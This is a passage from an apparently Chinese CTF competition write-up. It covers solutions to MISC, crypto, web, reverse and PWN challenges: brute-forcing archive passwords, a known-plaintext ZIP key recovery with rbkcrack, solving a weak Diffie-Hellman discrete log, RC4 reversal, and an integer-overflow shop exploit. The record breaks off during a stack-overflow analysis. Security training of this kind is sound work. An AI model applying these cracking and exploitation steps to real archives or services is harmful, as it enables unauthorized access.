re.finditer(x2, f)][<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">realpos = [<span class="built_in">int</span>(f[k+l1:k+l1+<span class="number">10</span>][:f[k+l1:k+l1+<span class="number">10</span>].index(<span class="string">b&#x27;-&#x27;</span>)]) <span class="keyword">for</span> k <span class="keyword">in</span> pos1]</span><br><span class="line">realval = [f[k+l2:k+l2+<span class="number">10</span>][<span class="number">0</span>] <span class="keyword">for</span> k <span class="keyword">in</span> pos2]</span><br><span class="line"></span><br><span class="line">out = [-<span class="number">1</span>]*<span class="number">2460</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pos1)):</span><br><span class="line">out[realpos[i]]=realval[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out.index(-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(out[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">out[<span class="number">2349</span>]=i</span><br><span class="line">outbyte = <span class="built_in">bytes</span>(out)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">f&#x27;xxx/flag<span class="subst">&#123;i&#125;</span>.7z&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(outbyte)</span><br></pre></td></tr></table></figure><p>生成的7z文件都加密，爆破无果。</p><p>后面放出提示 <code>filter: dns</code>，重新Wireshark打开流量包，过滤dns流量，发现域名 <code>.nss.neusoft.edu.cn</code> 前的主机名可以组成一串base64编码 <code>cGFzc3dvcmQ6IG5zc195eWRzIQ==</code>，解码有 <code>password: nss_yyds!</code>。</p><p>使用脚本批量尝试解压256个7z压缩包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uncompress</span>(<span class="params">path_name</span>):</span></span><br><span class="line"><span class="keyword">if</span> py7zr.is_7zfile(path_name):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">d_name = <span class="string">&#x27;nss_yyds!&#x27;</span></span><br><span class="line"><span class="keyword">with</span> py7zr.SevenZipFile(path_name,password=d_name, mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> sevenZ_f:</span><br><span class="line">sevenZ_f.extractall(path_name.rsplit(<span class="string">&quot;.7z&quot;</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Error when uncompress file! info: &#x27;</span>, e)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;This is not a true 7z file!&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    folder_name = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    os.chdir(folder_name)</span><br><span class="line">    files = os.listdir(folder_name)</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">        f_path = folder_name + os.sep + f</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(f_path):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;解压--&quot;</span>+f)</span><br><span class="line">            uncompress(path_name=f_path)</span><br></pre></td></tr></table></figure><p>运行完成发现 <code>flag194.7z</code> 解压成功，得到一张二维码，</p><p>扫描得到的内容，经hex+base64+base62+base58+base32 解码得flag：<code>flag&#123;6095B134-5437-4B21-BE52-EDC46A276297&#125;</code>。</p><p>​    </p><h3 id="ecryptedzip"><a href="#ecryptedzip" class="headerlink" title="ecryptedzip"></a>ecryptedzip</h3><p>只提供了一个带 <code>README.md</code> 和 <code>LICENSE</code> 两个文件的加密zip压缩包，用ARCHPR弱密码及字典都无法得到密码。</p><p>想到这两个文件经常默认出现在Github库中，随便找一个Github库，下载LICENSE文件，发现大小与压缩包内的LICENSE文件相近，可以采用已知部分明文（至少连续12字节）攻击方式破解。保留下载的LICENSE文件中前几行内容，用rbkcrack工具跑key：</p><p><code>rbkcrack.exe -C ecryptedzip.zip -c LICENSE -p LICENSE.txt</code></p><p>拿到三组key之后进行解密：</p><p><code>rbkcrack.exe -C ecryptedzip.zip -c README.md -k 32cc3495 7f955ff5 58291af3 -d README.md</code></p><p>或直接将key输入ARCHPR的明文攻击模式里的key输入框中，成功解压zip包。</p><p>flag：<code>flag&#123;Kn0wn_pla1ntext_attack_Is_very_Usefully&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="签到-键盘侠"><a href="#签到-键盘侠" class="headerlink" title="[签到]键盘侠"></a>[签到]键盘侠</h3><blockquote><p>UYTGBNM EDCV UYTGBNM TGBUHM YTFVBH QAZXCDE TYUHN EDCTGBF RFVYGN</p><p>flag{} 提交时括号内为大写字母</p></blockquote><p>键盘密码，按字母顺序在键位比划：<code>flag&#123;CLCKOUTHK&#125;</code>。</p><p>​    </p><h3 id="萌新-素数"><a href="#萌新-素数" class="headerlink" title="[萌新]素数"></a>[萌新]素数</h3><blockquote><p>目前768位的素数选择下，rsa等公钥加密算法已经不安全，rsa加密需要进行更大素数的选择，请您选出10个1024位以上的大素数提交给我</p><p><a href="http://sushu_tyen54ybg54dbgdnbd.nssctf.neusoft.edu.cn/">http://sushu_tyen54ybg54dbgdnbd.nssctf.neusoft.edu.cn/</a></p><p>备用</p><p><a href="http://sushu_5rg35rg4g.nssctf.neusoft.edu.cn/">http://sushu_5rg35rg4g.nssctf.neusoft.edu.cn/</a></p></blockquote><p>页面输入10个1024位以上的素数提交拿flag。生成1025位的素数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"><span class="built_in">print</span>(getPrime(<span class="number">1025</span>))</span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;d6a6a1bc-88e9-4330-83f9-bdd3bdad5401&#125;</code>。</p><p>​    </p><h3 id="silent-peeper"><a href="#silent-peeper" class="headerlink" title="silent_peeper"></a>silent_peeper</h3><blockquote><p>You are just a silent peeper, silently discovering the secret.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;&quot;</span></span><br><span class="line">bs = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + (bs - <span class="built_in">len</span>(s) % bs) * <span class="built_in">chr</span>(bs - <span class="built_in">len</span>(s) % bs)</span><br><span class="line"></span><br><span class="line">p = <span class="number">174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843</span></span><br><span class="line">g = <span class="number">41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977</span></span><br><span class="line">a = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">b = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">A = <span class="built_in">pow</span>(g, a, p)</span><br><span class="line">B = <span class="built_in">pow</span>(g, b, p)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(A, b, p) == <span class="built_in">pow</span>(B, a, p)</span><br><span class="line">key = <span class="built_in">pow</span>(A, b ,p)</span><br><span class="line">key = long_to_bytes(key)[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">ciphertext = cipher.encrypt(pad(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cipher&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;A, B = &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>((A, B))))</span><br><span class="line">    f.write(<span class="string">&quot;ciphertext = &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(binascii.hexlify(ciphertext)))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># cipher</span></span><br><span class="line"><span class="comment"># A, B = (142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016L, 16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544L)</span></span><br><span class="line"><span class="comment"># ciphertext = ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c</span></span><br></pre></td></tr></table></figure></blockquote><p>Diffie-Hellman密钥交换，已知生成元 $g$、模数 $p$ 和AB根据40位随机数 $a,b$ 生成的各自的数 $A=g^a \pmod p,B=g^b \pmod p$，求共享密钥 $K=g^{ab} \pmod p$。</p><p>$a,b$ 都为40位比较小，可以采用lambda算法解离散对数，解出 $a$ 或 $b$ 即可计算 $K$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">p = <span class="number">174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843</span></span><br><span class="line">g = <span class="number">41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977</span></span><br><span class="line">A, B = (<span class="number">142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016</span>, <span class="number">16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544</span>)</span><br><span class="line">k = GF(p)</span><br><span class="line">B = k(B)</span><br><span class="line">g = k(g)</span><br><span class="line">b = discrete_log_lambda(B,g,(<span class="number">1</span>,<span class="number">2</span>**<span class="number">40</span>))</span><br><span class="line">ciphertext = <span class="string">&#x27;ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c&#x27;</span></span><br><span class="line">key = <span class="built_in">pow</span>(A, b ,p)</span><br><span class="line">key = long_to_bytes(key)[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">m = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(ciphertext))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;21384433-0dc7-413b-9d09-64cc97c99730&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;21384433-0dc7-413b-9d09-64cc97c99730&#125;</code>。</p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="签到-flag"><a href="#签到-flag" class="headerlink" title="[签到] flag"></a>[签到] flag</h3><blockquote><p><a href="http://47.106.172.144:65333/">http://47.106.172.144:65333/</a></p></blockquote><p>页面不断随机输出flag各位置对应字符，复制，脚本填充：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">flag=[<span class="string">&#x27;?&#x27;</span>]*<span class="number">20</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">16</span>]=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">19</span>]=<span class="string">&#x27;9&#x27;</span></span><br><span class="line">flag[<span class="number">10</span>]=<span class="string">&#x27;N&#x27;</span></span><br><span class="line">flag[<span class="number">5</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">15</span>]=<span class="string">&#x27;n&#x27;</span></span><br><span class="line">flag[<span class="number">16</span>]=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">4</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">8</span>]=<span class="string">&#x27;c&#x27;</span></span><br><span class="line">flag[<span class="number">4</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">17</span>]=<span class="string">&#x27;W&#x27;</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">2</span>]=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">flag[<span class="number">7</span>]=<span class="string">&#x27;u&#x27;</span></span><br><span class="line">flag[<span class="number">9</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">8</span>]=<span class="string">&#x27;c&#x27;</span></span><br><span class="line">flag[<span class="number">17</span>]=<span class="string">&#x27;W&#x27;</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">9</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">13</span>]=<span class="string">&#x27;G&#x27;</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">0</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">0</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">10</span>]=<span class="string">&#x27;N&#x27;</span></span><br><span class="line">flag[<span class="number">12</span>]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">flag[<span class="number">1</span>]=<span class="string">&#x27;m&#x27;</span></span><br><span class="line">flag[<span class="number">0</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">14</span>]=<span class="string">&#x27;9&#x27;</span></span><br><span class="line">flag[<span class="number">1</span>]=<span class="string">&#x27;m&#x27;</span></span><br><span class="line">flag[<span class="number">0</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">16</span>]=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">14</span>]=<span class="string">&#x27;9&#x27;</span></span><br><span class="line">flag[<span class="number">16</span>]=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">13</span>]=<span class="string">&#x27;G&#x27;</span></span><br><span class="line">flag[<span class="number">3</span>]=<span class="string">&#x27;h&#x27;</span></span><br><span class="line">flag[<span class="number">12</span>]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">12</span>]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">flag[<span class="number">15</span>]=<span class="string">&#x27;n&#x27;</span></span><br><span class="line">flag[<span class="number">3</span>]=<span class="string">&#x27;h&#x27;</span></span><br><span class="line">flag[<span class="number">9</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">17</span>]=<span class="string">&#x27;W&#x27;</span></span><br><span class="line">flag[<span class="number">5</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">6</span>]=<span class="string">&#x27;t&#x27;</span></span><br><span class="line">flag[<span class="number">18</span>]=<span class="string">&#x27;5&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"><span class="comment"># ZmxhZ3tuc3NfbG9naW59</span></span><br></pre></td></tr></table></figure><p>base64解码得flag：<code>flag&#123;nss_login&#125;</code>。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="签到-signin"><a href="#签到-signin" class="headerlink" title="[签到]signin"></a>[签到]signin</h3><blockquote><p>逆向 真 签到题</p></blockquote><p>010editor 16进制查看，搜索出flag：<code>flag&#123;REVERSE_1s_Very_3asy!&#125;</code>。</p><p>​    </p><h3 id="萌新-happyCTF"><a href="#萌新-happyCTF" class="headerlink" title="[萌新]happyCTF"></a>[萌新]happyCTF</h3><p>IDA反编译，发现去了符号，分析代码逻辑，需输入长度24的flag字符串，经 <code>sub_403B70()</code> 函数里逐字符异或0x14后，与字符串 <code>rxusoCqxw&#123;yqK`&#123;KZqag&#123;r`i</code> 比较，相等则通过。</p><p>按异或性质，将字符串与0x14逐字符异或还原flag：<code>flag&#123;Welcome_to_Neusoft&#125;</code>。</p><p>​    </p><h3 id="Remember-Crypt-4"><a href="#Remember-Crypt-4" class="headerlink" title="Remember Crypt 4"></a>Remember Crypt 4</h3><p>从题目就能猜出是RC4，<code>main()</code> 函数代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-D4h]</span></span><br><span class="line">  <span class="keyword">void</span> *v9; <span class="comment">// [rsp+28h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-C8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">128</span>]; <span class="comment">// [rsp+50h] [rbp-A8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Str, <span class="string">&quot;12345678abcdefghijklmnopqrspxyz&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Str[<span class="number">32</span>], <span class="number">0</span>, <span class="number">0x60</span>ui64);</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="number">0x17</span>ui64);</span><br><span class="line">  sub_1400054D0(<span class="string">&quot;%s&quot;</span>, v10);</span><br><span class="line">  v9 = <span class="built_in">malloc</span>(<span class="number">0x408</span>ui64);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  sub_140001120(v9, Str, v3);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(v10);</span><br><span class="line">  sub_140001240(v9, v10, v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">22</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)v10[i] ^ <span class="number">0x22</span>) != byte_14013B000[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="keyword">void</span> *)sub_1400015A0(&amp;off_14013B020, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">      _CallMemberFunction0(v5, sub_140001F10);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = (<span class="keyword">void</span> *)sub_1400015A0(&amp;off_14013B020, <span class="string">&quot;nice job&quot;</span>);</span><br><span class="line">  _CallMemberFunction0(v7, sub_140001F10);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体逻辑为，输入字符串经过 <code>sub_140001120()</code> 和 <code>sub_140001240()</code> 函数处理后，与0x22异或，与 <code>byte_14013B000</code> 数组比较。看两函数特征，分别为RC4算法的KSA和PRGA函数，key为 <code>12345678abcdefghijklmnopqrspxyz</code>。</p><p>IDA提取数组hex值：<code>9EE7305FA701A653591B0A20F173D10EAB09840E8D2B0000</code>，Cyberchef FromHex+XOR+RC4一把梭，得到flag：<code>flag&#123;nice_to_meet_you&#125;</code>。</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="签到-NssShop"><a href="#签到-NssShop" class="headerlink" title="[签到]NssShop"></a>[签到]NssShop</h3><blockquote><p>nc 47.106.172.144 65002</p><p>真 签到题 不会PWN的同学也可以来试试</p></blockquote><p>nc连接，当前金额为0，选择 <code>1.Buy Item</code>，</p><p>看到flag价格10000，hint价格0，选择 <code>1.Hint:0$</code>，</p><p>回显 <code>Unlimited purchase of items in the shop</code>，说明数量无上限。</p><p>利用int型溢出性质，使得flag单价与数量乘积的总价上溢为负数即可。</p><p>选择 <code>0.Flag:10000$</code>，输入数量111111111，得到flag：<code>flag&#123;Pwn_Is_Vary_Ez&#125;</code>。</p><h3 id="justdoit"><a href="#justdoit" class="headerlink" title="justdoit"></a>justdoit</h3><blockquote><p>nc 47.106.172.144 65004</p></blockquote><p>IDA分析，<code>main()</code> 函数代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hi there! What is your name? &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;That is an interesting chall&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;where are you from? my frends??&quot;</span>);</span><br><span class="line">  read_long();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read_long()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">read_long</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x13</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> atol(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码看不出有什么利用之处，切换回汇编视图，发现 <code>read_long()</code> 函数在返回rax值时，rbp存在一个加操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011D5 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000000004011D5                 public main</span><br><span class="line">.text:00000000004011D5 main            proc near               ; DATA XREF: _start+21↑o</span><br><span class="line">.text:00000000004011D5</span><br><span class="line">.text:00000000004011D5 buf             = byte ptr -20h</span><br><span class="line">.text:00000000004011D5</span><br><span class="line">.text:00000000004011D5 ; __unwind 